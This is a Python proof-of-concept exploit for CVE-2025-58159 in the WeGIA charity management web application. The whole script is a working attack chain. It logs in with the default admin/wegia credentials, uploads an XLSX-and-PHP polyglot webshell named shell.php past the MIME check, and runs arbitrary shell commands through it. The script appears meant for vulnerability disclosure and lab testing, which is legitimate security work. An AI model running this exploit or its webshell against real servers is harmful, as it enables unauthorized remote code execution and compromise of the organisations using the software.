#!/usr/bin/env python3
"""
PoC for CVE-2025-58159: Unrestricted File Upload → Remote Code Execution in WeGIA

Demonstrates CWE-434 / CWE-94 in WeGIA (Web Manager for Charitable Institutions)
versions < 3.4.11. The file upload endpoint at controla_xlsx.php validates MIME type
via finfo_file() but does NOT validate the file extension. An authenticated attacker
can upload a PHP webshell disguised as an XLSX file, achieving Remote Code Execution.

Attack chain:
  1. Authenticate with valid credentials (default: admin/wegia)
  2. Craft a polyglot file: valid XLSX (ZIP) content + appended PHP code
  3. Upload with .php extension — MIME check passes (ZIP magic bytes)
  4. Access the uploaded file via web to execute arbitrary PHP code

Usage:
  python3 poc.py <target_host> [port] [command]
  python3 poc.py 172.20.0.4 80 id
"""

import sys
import io
import json
import zipfile
import http.client
import http.cookiejar
import urllib.request
import urllib.parse
import urllib.error
import uuid
import re


# ─── Minimal XLSX Generator (stdlib only) ───────────────────────────────────

def create_minimal_xlsx():
    """
    Create a minimal valid XLSX file in memory using only stdlib.
    XLSX is an Office Open XML format — a ZIP archive containing XML files.
    This minimal set passes finfo_file() MIME detection as:
      application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        # [Content_Types].xml — required for OOXML format recognition
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>''')

        # _rels/.rels — package relationships
        zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>''')

        # xl/workbook.xml — workbook definition
        zf.writestr('xl/workbook.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
  </sheets>
</workbook>''')

        # xl/_rels/workbook.xml.rels — workbook relationships
        zf.writestr('xl/_rels/workbook.xml.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>''')

        # xl/worksheets/sheet1.xml — empty worksheet
        zf.writestr('xl/worksheets/sheet1.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>test</t></is></c></row>
  </sheetData>
</worksheet>''')

    return buf.getvalue()


# ─── Multipart Form Data Builder (stdlib only) ──────────────────────────────

def build_multipart_formdata(fields, files):
    """
    Build a multipart/form-data body with the given fields and files.

    fields: list of (name, value) tuples for regular form fields
    files: list of (field_name, filename, content_bytes, content_type) tuples

    Returns (body_bytes, content_type_header)
    """
    boundary = '----CVEForge' + uuid.uuid4().hex
    parts = []

    for name, value in fields:
        parts.append(f'--{boundary}\r\n'.encode())
        parts.append(f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode())
        parts.append(f'{value}\r\n'.encode())

    for field_name, filename, content, content_type in files:
        parts.append(f'--{boundary}\r\n'.encode())
        parts.append(
            f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
        )
        parts.append(f'Content-Type: {content_type}\r\n\r\n'.encode())
        parts.append(content)
        parts.append(b'\r\n')

    parts.append(f'--{boundary}--\r\n'.encode())

    body = b''.join(parts)
    content_type = f'multipart/form-data; boundary={boundary}'
    return body, content_type


# ─── Exploit Functions ──────────────────────────────────────────────────────

def authenticate(host, port, cpf='admin', password='wegia'):
    """
    Step 1: Authenticate to WeGIA and obtain a PHPSESSID session cookie.

    WeGIA login is a POST to /html/login.php with cpf= and pwd= fields.
    On success, server responds with 302 redirect and Set-Cookie: PHPSESSID=...
    """
    print(f"[*] Authenticating to http://{host}:{port} as '{cpf}'...")

    conn = http.client.HTTPConnection(host, port, timeout=15)

    login_data = urllib.parse.urlencode({'cpf': cpf, 'pwd': password})
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
    }

    conn.request('POST', '/html/login.php', body=login_data, headers=headers)
    resp = conn.getresponse()
    body = resp.read()

    # Extract PHPSESSID from Set-Cookie header
    session_id = None
    for header_name, header_value in resp.getheaders():
        if header_name.lower() == 'set-cookie':
            match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', header_value)
            if match:
                session_id = match.group(1)
                break

    conn.close()

    if not session_id:
        print(f"[-] Authentication failed! HTTP {resp.status}")
        print(f"    Response headers: {resp.getheaders()}")
        return None

    print(f"[+] Authentication successful! PHPSESSID={session_id[:16]}...")
    return session_id


def upload_webshell(host, port, session_id, php_payload=None):
    """
    Step 2-3: Craft a polyglot XLSX+PHP file and upload via controla_xlsx.php.

    The MIME bypass works because:
    - finfo_file() checks magic bytes at the start of the file
    - XLSX starts with PK\\x03\\x04 (ZIP header) → detected as XLSX MIME type
    - PHP code appended after XLSX content is ignored by finfo but executed by PHP
    - PHP interpreter ignores all binary content before <?php tags

    The extension bypass works because:
    - The code extracts extension from user-supplied filename
    - No whitelist check is performed on the extension
    - File is saved as <uniqid>_<name>.php in web-accessible tabelas/ directory
    """
    if php_payload is None:
        # Default payload: execute command from 'cmd' GET parameter
        php_payload = b'\n<?php echo "CVE-2025-58159-RCE-CONFIRMED"; echo "|"; system($_GET["cmd"]); ?>'

    print("[*] Generating minimal XLSX file...")
    xlsx_bytes = create_minimal_xlsx()
    print(f"    XLSX size: {len(xlsx_bytes)} bytes")
    print(f"    XLSX magic: {xlsx_bytes[:4].hex()} (PK header: {'YES' if xlsx_bytes[:4] == b'PK\\x03\\x04' else 'check'})")

    # Create polyglot: XLSX content + PHP payload appended
    malicious_content = xlsx_bytes + php_payload
    print(f"    Payload size: {len(malicious_content)} bytes (XLSX + PHP)")

    print("[*] Uploading polyglot file with .php extension...")

    # Build multipart upload with filename=shell.php
    body, content_type = build_multipart_formdata(
        fields=[],
        files=[
            (
                'arquivo',                  # form field name expected by controla_xlsx.php
                'shell.php',                # malicious .php extension — NOT validated by server
                malicious_content,
                'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
            )
        ]
    )

    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {
        'Content-Type': content_type,
        'Cookie': f'PHPSESSID={session_id}',
    }

    conn.request(
        'POST',
        '/html/socio/sistema/controller/controla_xlsx.php',
        body=body,
        headers=headers
    )

    resp = conn.getresponse()
    resp_body = resp.read().decode('utf-8', errors='replace')
    conn.close()

    print(f"    Upload response: HTTP {resp.status}")

    if resp.status == 404:
        print("[-] Upload endpoint not found (HTTP 404)")
        print("    The controla_xlsx.php endpoint does not exist on this server.")
        print("    This is expected on patched versions (>= 3.4.11) where the file was removed.")
        return None

    if resp.status != 200:
        print(f"[-] Upload failed with HTTP {resp.status}")
        print(f"    Response: {resp_body[:500]}")
        return None

    # Parse JSON response to get upload path
    try:
        result = json.loads(resp_body)
    except json.JSONDecodeError:
        print(f"[-] Failed to parse JSON response: {resp_body[:500]}")
        return None

    print(f"    JSON response: {json.dumps(result, ensure_ascii=False)}")

    if not result.get('resultado'):
        print(f"[-] Upload rejected by server: {result.get('mensagem', 'unknown error')}")
        return None

    upload_url = result.get('url', '')
    if not upload_url:
        print("[-] No URL in upload response")
        return None

    # Convert relative path ./tabelas/... to absolute URL path
    # The response returns: ./tabelas/<uniqid>_shell.php
    # Full URL path: /html/socio/sistema/tabelas/<uniqid>_shell.php
    if upload_url.startswith('./'):
        shell_path = '/html/socio/sistema/' + upload_url[2:]
    else:
        shell_path = '/html/socio/sistema/' + upload_url

    print(f"[+] Upload successful!")
    print(f"    Server path: {upload_url}")
    print(f"    Shell URL: http://{host}:{port}{shell_path}")

    return shell_path


def execute_command(host, port, shell_path, command='id', session_id=None):
    """
    Step 4: Access the uploaded PHP webshell to execute commands.

    When Apache serves the .php file:
    - Binary XLSX content is output as garbage (ignored)
    - PHP engine encounters <?php tag and executes our code
    - system() runs the shell command, output is sent in the HTTP response
    """
    print(f"[*] Executing command: {command}")

    # URL-encode the command parameter
    params = urllib.parse.urlencode({'cmd': command})
    url_path = f"{shell_path}?{params}"

    conn = http.client.HTTPConnection(host, port, timeout=15)
    headers = {}
    if session_id:
        headers['Cookie'] = f'PHPSESSID={session_id}'

    conn.request('GET', url_path, headers=headers)
    resp = conn.getresponse()
    resp_body = resp.read()
    conn.close()

    if resp.status != 200:
        print(f"[-] Shell access failed: HTTP {resp.status}")
        return None

    # The response contains binary XLSX garbage + our marker + command output
    # Look for our marker to extract clean output
    resp_text = resp_body.decode('utf-8', errors='replace')

    marker = 'CVE-2025-58159-RCE-CONFIRMED'
    if marker in resp_text:
        # Extract everything after the marker and separator
        parts = resp_text.split(marker)
        if len(parts) > 1:
            cmd_output = parts[1]
            # Remove leading pipe separator
            if cmd_output.startswith('|'):
                cmd_output = cmd_output[1:]
            cmd_output = cmd_output.strip()
            return cmd_output

    # Fallback: try to find command output patterns
    return resp_text


def exploit(target_host, target_port, command='id'):
    """
    Full exploit chain for CVE-2025-58159.

    Returns True if RCE was achieved, False otherwise.
    """
    print("=" * 70)
    print(f"  CVE-2025-58159: WeGIA Unrestricted File Upload → RCE")
    print(f"  Target: http://{target_host}:{target_port}")
    print("=" * 70)
    print()

    # ── Step 1: Authenticate ─────────────────────────────────────────────
    session_id = authenticate(target_host, target_port)
    if not session_id:
        print("\n[!] EXPLOIT FAILED: Could not authenticate")
        return False
    print()

    # ── Step 2-3: Upload polyglot webshell ───────────────────────────────
    shell_path = upload_webshell(target_host, target_port, session_id)
    if not shell_path:
        print("\n[!] EXPLOIT FAILED: Could not upload webshell")
        return False
    print()

    # ── Step 4: Execute command via webshell ──────────────────────────────
    output = execute_command(target_host, target_port, shell_path, command, session_id)

    if output is None:
        print("\n[!] EXPLOIT FAILED: Could not execute command")
        return False

    print(f"[+] Command output:")
    print(f"    {output}")
    print()

    # ── Verify RCE ───────────────────────────────────────────────────────
    # Run additional verification commands
    print("[*] Running verification commands...")

    whoami = execute_command(target_host, target_port, shell_path, 'whoami', session_id)
    hostname = execute_command(target_host, target_port, shell_path, 'hostname', session_id)
    uname = execute_command(target_host, target_port, shell_path, 'uname -a', session_id)

    print(f"    whoami:   {whoami}")
    print(f"    hostname: {hostname}")
    print(f"    uname -a: {uname}")
    print()

    # ── Summary ──────────────────────────────────────────────────────────
    rce_confirmed = output is not None and len(output) > 0

    if rce_confirmed:
        print("=" * 70)
        print("  [+] REMOTE CODE EXECUTION CONFIRMED!")
        print(f"  [+] Webshell: http://{target_host}:{target_port}{shell_path}")
        print(f"  [+] Running as: {whoami}")
        print("=" * 70)
    else:
        print("=" * 70)
        print("  [-] EXPLOIT FAILED: RCE could not be confirmed")
        print("=" * 70)

    return rce_confirmed


if __name__ == '__main__':
    target = sys.argv[1] if len(sys.argv) > 1 else '172.20.0.4'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    cmd = sys.argv[3] if len(sys.argv) > 3 else 'id'

    try:
        success = exploit(target, port, cmd)
        sys.exit(0 if success else 1)
    except ConnectionRefusedError:
        print(f"[-] Connection refused to {target}:{port}")
        sys.exit(1)
    except ConnectionError as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
